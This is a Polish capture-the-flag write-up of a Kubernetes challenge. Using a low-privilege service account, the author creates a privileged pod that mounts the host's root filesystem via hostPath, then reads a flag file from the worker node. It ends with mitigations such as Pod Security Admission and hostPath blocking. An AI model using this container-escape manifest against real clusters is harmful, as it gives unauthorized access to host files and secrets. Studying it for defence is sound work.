# Volume Flag — writeup

**Autor:** Paweł Murdzek
**Kategoria:** DevSecOps / Kubernetes
**Format flagi:** `ecsc{...}`

## Opis zadania

W katalogu `volume-flag` dostałem jeden plik — `config4`. Jest to kubeconfig dla klastra Kubernetes, w którym jestem uwierzytelniony jako ServiceAccount `player04` w namespace `volume-flag`. Cel: znaleźć flagę.

## Recon

### Sprawdzenie tożsamości i kontekstu

Ustawiam `KUBECONFIG` na otrzymany plik i weryfikuję połączenie:

```bash
export KUBECONFIG=./config4
kubectl auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:serviceaccount:volume-flag:player04
UID         cf0ffb58-c021-4005-93d3-1cf4f6e2262f
Groups      [system:serviceaccounts system:serviceaccounts:volume-flag system:authenticated]
```

Klaster: `https://10.250.3.1:6443`, namespace: `volume-flag`.

### Enumeracja uprawnień

```bash
kubectl auth can-i --list -n volume-flag
```

Istotne uprawnienia:

```
Resources    Verbs
pods         [get list create]
pods/exec    [get list create]
```

Próby listowania innych obiektów w klastrze kończą się błędem `Forbidden`:

```bash
kubectl get pv,pvc,configmap,secret,storageclass,deployment -A
# Error from server (Forbidden): ... cannot list resource ...
```

Mam więc do dyspozycji jedynie:
- tworzenie podów w namespace `volume-flag`,
- wykonywanie poleceń wewnątrz utworzonych podów (`exec`).

Brak istniejących podów:

```bash
kubectl get pods -n volume-flag
# No resources found in volume-flag namespace.
```

## Wektor ataku

Skoro mogę tworzyć dowolne pody, sprawdzam, czy klaster ma wymuszony **Pod Security Admission** (PSA) ograniczający uprzywilejowane workloady. Jeśli nie, mogę zamontować system plików hosta przez `hostPath` i uciec z izolacji kontenera. Klasyczny ruch dla zadania o nazwie *volume-flag*.

## Exploit

### Manifest poda

`pod.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hunter
  namespace: volume-flag
spec:
  restartPolicy: Never
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: busybox:1.36
    command: ["sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
      runAsUser: 0
    volumeMounts:
    - name: hostroot
      mountPath: /host
  volumes:
  - name: hostroot
    hostPath:
      path: /
      type: Directory
```

Kluczowe elementy:
- `hostPath: /` — montuję cały filesystem worker node'a w `/host`,
- `privileged: true` + `runAsUser: 0` — pełny dostęp odczytu/zapisu,
- `hostPID` / `hostNetwork` — bonus na wypadek, gdyby flaga była dostępna tylko przez sieć/proces hosta.

### Uruchomienie

```bash
kubectl apply -f pod.yaml
kubectl get pod hunter -n volume-flag -o wide
```

```
NAME     READY   STATUS    RESTARTS   AGE   IP           NODE       NOMINATED NODE
hunter   1/1     Running   0          7s    10.250.3.3   worker02   <none>
```

PSA nie był wymuszony — pod ruszył jako privileged bez zastrzeżeń.

### Eksploracja hosta

```bash
kubectl exec -n volume-flag hunter -- sh -c 'ls /host'
```

```
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found
media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz ...
```

Mam pełen filesystem worker node'a. Najpierw szukam plików zawierających `flag` w nazwie wewnątrz volumes innych podów (typowa ścieżka dla tej kategorii zadań):

```bash
kubectl exec -n volume-flag hunter -- sh -c \
  'find /host/var/lib/kubelet/pods -maxdepth 9 -type f -iname "*flag*" 2>/dev/null'
```

Wynik to wyłącznie pliki konfiguracyjne Cilium (`monitor-aggregation-flags`) — false positives. Także `grep -r "ecsc{" /host/var/lib/kubelet/pods` nie daje trafień.

Rozszerzam wyszukiwanie na typowe lokacje CTF — `/root`, `/tmp`, `/opt`, `/home`:

```bash
kubectl exec -n volume-flag hunter -- sh -c 'ls -la /host/home'
```

```
drwxr-xr-x  3 root root 4096 Oct 28  2025 .
drwxr-xr-x 19 root root 4096 Oct 28  2025 ..
drwx------ 18 1000 1000 4096 Apr 27 15:14 clr
```

```bash
kubectl exec -n volume-flag hunter -- sh -c 'ls -la /host/home/clr'
```

```
...
drwxr-xr-x  2 root root  4096 Apr 27 14:41 data
-rw-r--r--  1 1000 1000    33 Apr 27 15:14 flag.txt
```

Trafione — `/home/clr/flag.txt`, 33 bajty.

### Odczyt flagi

```bash
kubectl exec -n volume-flag hunter -- sh -c 'cat /host/home/clr/flag.txt'
```

```
ecsc{yoyoyoy_good_job_5234%Y#Y%}
```

## Flaga

```
ecsc{yoyoyoy_good_job_5234%Y#Y%}
```

## Wnioski i mitygacje

Ta podatność to suma trzech błędów konfiguracyjnych klastra:

1. **Brak Pod Security Admission na namespace `volume-flag`.**
   ServiceAccount z uprawnieniami do tworzenia podów może zażądać `privileged: true`, `hostPath`, `hostPID`, `hostNetwork`, `runAsUser: 0` — i wszystko przejdzie. Wystarczy włączyć tryb `restricted` na namespace:

   ```yaml
   apiVersion: v1
   kind: Namespace
   metadata:
     name: volume-flag
     labels:
       pod-security.kubernetes.io/enforce: restricted
       pod-security.kubernetes.io/enforce-version: latest
   ```

2. **`hostPath` nie jest blokowany na poziomie admission.**
   `hostPath` daje atakującemu pełny filesystem hosta — to praktycznie zawsze container escape. Powinien być całkowicie zablokowany przez `ValidatingAdmissionPolicy` lub Kyverno/OPA Gatekeeper, z białą listą tylko dla DaemonSetów systemowych (CNI, log shipper).

3. **Wrażliwe dane na worker node poza klastrem.**
   `flag.txt` w `/home/clr/` to dane użytkownika Linuksa, dostępne dla każdego, kto ucieknie z dowolnego poda. Worker node'y nie powinny zawierać ani danych użytkowników, ani sekretów aplikacyjnych w surowych plikach.

Dodatkowo:
- ServiceAccount nie powinien mieć `pods/create` bez restrykcji — RBAC powinien wymuszać konkretne `PodTemplates` lub używać Pod Security Standards w trybie `restricted`.
- Obrazy w klastrze powinny być uruchamiane z `runAsNonRoot: true`, `readOnlyRootFilesystem: true`, `allowPrivilegeEscalation: false`.

## Sprzątanie

Pod zostawiam uruchomiony — środowisko jest lokalne, klaster znika po zakończeniu zadania. Jeśli chciałbym usunąć:

```bash
kubectl delete pod hunter -n volume-flag
```
